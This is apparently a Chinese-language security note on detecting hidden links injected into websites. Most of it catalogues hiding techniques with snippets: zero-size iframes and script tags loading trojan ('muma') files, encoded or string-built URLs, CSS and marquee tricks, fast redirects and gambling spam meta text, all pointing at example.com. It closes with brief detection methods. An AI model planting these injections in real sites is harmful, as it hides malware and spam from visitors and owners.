### 暗链检测
暗链即隐藏链接，对于搜索引擎爬虫可见，而在用户浏览器呈现视觉样式中不可见。
要做到在浏览器中不可见的视觉效果，源码中会用到一些`html、css、javascript`的隐藏方式。
常见的暗链隐藏方式有如下几种。

1、框架挂马
```
<iframe src="http://www.example.com" width=0 height=0></iframe>
```

2、js文件挂马

首先将以下代码
```
document.write("<iframe width='0' height='0' src='http://www.example.com'></iframe>");
```
保存为xxx.js， 则JS挂马代码为
```
<script language=javascript src="http://www.example.com/xxx.js"></script>
```

3、js变形加密 
```
<script language="JScript.Encode" src="http://www.example.com/muma.js"></script>
```
muma.txt可改成任意后缀

4、body挂马
```
<body ></body>
```

5、隐蔽挂马
```
top.document.body.innerHTML = top.document.body.innerHTML+'<iframe src="http://www.example.com/muma.html"></iframe>';
```

6、css中挂马
目前浏览器,`firefox IE11,edge`不支持。
```
body {
	background-image: url('javascript:document.write("<script src=http://www.example.com/muma.js></script>")')
}
```

7、javascript挂马
弹窗式挂马，目前`firefox IE11,edge`等浏览器会自动阻止该方法。
```
<script language=javascript> 
	window.open ("http://www.example.com/","","toolbar=no,location=no,directories=no,status=no,menubar=no,scro llbars=no,width=1,height=1"); 
</script>
```

8、图片伪装
```
<html>
<head><title>test</title></head>
<body>
	<iframe src="http://www.example.com/" height=0 width=0></iframe>
	<img src="http://www.example.com/1.png">
</body>
</html>
```

9、伪装调用
```
<frameset rows="444,0" cols="*">
	<frame src="http://www.example.com/" framborder="no" scrolling="auto" noresize marginwidth="0" margingheight="0">
	<frame src="http://www.example.com/" frameborder="no" scrolling="no" noresize marginwidth="0"margingheight="0">
</frameset>
```

10、利用javscript脚本写隐藏功能
```
<a href="http://www.example.com/(迷惑连接地址，显示这个地址指向木马地址)" > 页面要显示的内容 </a>
<script language="javascript">
function www_example_com ()
{
	var url="http://www.example.com/";
	open(url,"NewWindow","toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,copyhistory=yes,width=800,height=600,left=10,top=10");
}

function comb(){
	var h='h',t='t',p='p',symbol1=':',symbol2='/',w='w',e='e',x='x',a='a',m='m',l='l',symbol3='.',c='c',o='o';
	var url = h+t+t+p+symbol1+symbol2+symbol2+w+w+w+symbol3+e+x+a+m+p+l+e+symbol3+c+o+m;
	window.open (url,"","");
}

</script>
```
11、CSS隐藏属性
```
<a href="http://www.example.com/" style="display:none">invisible anchor text</a>
```

12、HTML、CSS样式
`CSS`的样式`display:none`或`visibility:hidden`，可以使元素隐藏不可见。

元素向前缩进的属性为负值，即在可视窗域外
```
<div style="text-indent:-469em;display:block;float:left">invisible anchor text</div>
```
利用`div`层的`ｚ`轴属性，即垂直于屏幕的层次位置，将意欲层的`ｚ`轴属性，即垂直于屏幕的层次位置，将意欲
隐藏的链接以及锚文本放置到在其他可见层之下。
```
<div id="back" style="position:absolute;z-index:-1">
	<a href="http://www.example.com/" target="_blank">visible anchor text</a>
</div>
```
利用颜色属性，设置链接锚文本背景色和链接文本颜色很
相似或一致，人眼难以辨认。
```
<a href="http://www.example.com/" target="_blank" style="color:#ffffff">visible anchor text</a>
```
将链接以及锚文本的字体大小设为`０`像素。
```
<a href="http://www.example.com/" target="_blank" style="font-size:0px;">visible anchor text</a>
```
将链接或锚文本放在很小`div`块中。
```
<div style="font-size:0px;">
	<a href="http://www.example.com/" target="_blank">visible anchor text</a>
</div>
```
利用内联框架占满整个页面遮盖不相关链接，内联框架内放置正常内容的页面，框架外写大量不相关链接，并且内联框架`iframe`定义为占满整个屏幕，使浏览者无法看到不相关链接。
```
<iframe name=Customers_List src="target.html" width="100%" height="100%" scrolling="auto" style="margin:0">
</iframe>
<div><a href="http://www.example.com/" target="_blank">visible anchor text</a></div>

```
利用`html`元素`marquee`滚动块的滚动速度属性。配合尺寸属性较小值如个位数，将scrollamount设置为较大，通常至少为`４`位数（该数值越大，`marquee`中的内容滚动速度越快），这样人眼无法在浏览器中看到。
```
<marquee height=1 width=8 scrollamount=3000>
	<a href="http://www.example.com/" target="_blank">visible anchor text</a>
</marquee>
```
对此本文进行了测试实验，发现将高度`height`或`width`值设置小于`10`的个位数值，并将滚动速度属性`scrollamount`设置为`1000`以上即几乎无法辨识

在`meta`标签中插入链接
```
<!-- target.html content-->
<meta name="description" content="交通运输百家乐（www.example.com）澳门赌场旗下博彩门户，在这里我们为您提供百家乐、博彩通、全讯网、博彩、娱乐城、澳门百家乐、赌博、赌博网、盘口、足球比分、足球投注等服务，欢迎您的光临">
```

13、利用`http`重定向机制

快速跳转到正常页面，但在跳转之前的中间页面写入不相关链接，由于快速跳转到正常页面使浏览者无法察觉。
```
<script>
setTimeOut("window.location='http://www.exampl.com'",0.1);
</script>
<body leftMargin=0 topMargin=0 scroll=no>
	<div><a href="http://www.example.com">invisible text</a></div>
</body>
```

### 检测方法
1、站长自测，通过查看自己站点的网页源码、利用`FTP`工具查看修改时间等方式检测站内未知链接等，检测自己的网站是否被注入暗链。(费时费力，效率低效)
2、通过特征词库建立黑白名单，通过简单匹配进行判定，简单快速，但对特征词库的建立有一定的局限性。
3、WEKA机器学习，建模训练。
